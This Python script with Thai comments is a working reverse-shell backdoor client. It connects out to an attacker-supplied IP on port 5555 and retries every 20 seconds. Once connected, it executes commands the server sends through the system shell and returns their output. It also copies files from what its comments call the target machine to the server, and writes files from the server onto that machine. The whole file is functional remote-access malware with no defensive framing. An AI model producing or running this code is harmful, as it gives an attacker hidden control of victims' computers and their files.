import socket
import time
import subprocess
import json
import os

# รับที่อยู่ IP ของเซิร์ฟเวอร์จากผู้ใช้
ip = input("กรุณากรอกที่อยู่ IP ของเซิร์ฟเวอร์: ")

def reliable_send(data):
    # ส่งข้อมูลไปยังเซิร์ฟเวอร์ในรูปแบบ JSON
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    # รับข้อมูลจากเซิร์ฟเวอร์ในรูปแบบ JSON
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection():
    # เชื่อมต่อกับเซิร์ฟเวอร์
    while True:
        time.sleep(20)
        try:
            s.connect((ip, 5555))  # เชื่อมต่อกับ IP และพอร์ต
            shell()  # เรียกใช้งาน shell สำหรับรับคำสั่ง
            s.close()  # ปิดการเชื่อมต่อหลังจากรันคำสั่งเสร็จ
            break
        except:
            print("ไม่สามารถเชื่อมต่อได้ กำลังพยายามเชื่อมต่อใหม่...")
            continue  # หากไม่สามารถเชื่อมต่อได้ จะพยายามเชื่อมต่อใหม่

def upload_file(file_name):
    # อัปโหลดไฟล์จากเครื่องเป้าหมายไปยังเซิร์ฟเวอร์
    f = open(file_name, 'rb')
    s.send(f.read())

def download_file(file_name):
    # ดาวน์โหลดไฟล์จากเซิร์ฟเวอร์ไปยังเครื่องเป้าหมาย
    f = open(file_name, 'wb')
    s.settimeout(1)  # ตั้งเวลา timeout
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)  # ยกเลิก timeout
    f.close()

def shell():
    # ฟังก์ชันสำหรับรับคำสั่งจากเซิร์ฟเวอร์และรันคำสั่งบนเครื่องเป้าหมาย
    while True:
        command = reliable_recv()  # รับคำสั่งจากเซิร์ฟเวอร์
        if command == 'quit':  # หากคำสั่งเป็น quit จะหยุดการทำงาน
            break
        elif command == 'clear':  # หากคำสั่งเป็น clear จะไม่ทำอะไร
            pass
        elif command[:3] == 'cd ':  # หากคำสั่งเป็น cd จะเปลี่ยนไดเร็กทอรี
            os.chdir(command[3:])
        elif command[:8] == 'download':  # หากคำสั่งเป็น download จะอัปโหลดไฟล์
            upload_file(command[9:])
        elif command[:6] == 'upload':  # หากคำสั่งเป็น upload จะดาวน์โหลดไฟล์
            download_file(command[7:])
        else:  # หากเป็นคำสั่งอื่น ๆ จะรันคำสั่งใน shell
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()  # อ่านผลลัพธ์จากการรันคำสั่ง
            result = result.decode()
            reliable_send(result)  # ส่งผลลัพธ์กลับไปยังเซิร์ฟเวอร์

# สร้างการเชื่อมต่อ socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()  # เริ่มการเชื่อมต่อและรัน shell